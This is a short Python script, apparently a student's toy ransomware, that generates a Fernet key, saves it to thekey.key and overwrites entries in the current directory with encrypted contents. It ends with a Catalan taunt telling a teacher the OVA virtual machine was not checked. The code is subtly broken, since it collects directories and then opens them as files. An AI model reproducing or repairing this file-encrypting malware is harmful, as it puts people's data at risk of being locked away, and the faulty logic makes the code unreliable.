#
import os
from cryptography.fernet import Fernet
#
files = []
#
for file in os.listdir():
    if file == 'en.py' or file == "thekey.key" or file == "de.py":
        continue
    if os.path.isdir(file):
        files.append(file)
#
print(files)
#
key = Fernet.generate_key()
#
with open('thekey.key', 'wb') as the_key:
    the_key.write(key)
#
for file in files:
    with open(file, "rb") as thefile:
        contentens = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contentens)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
#
print("Profe, no has comprobat que la OVA estigui be.")

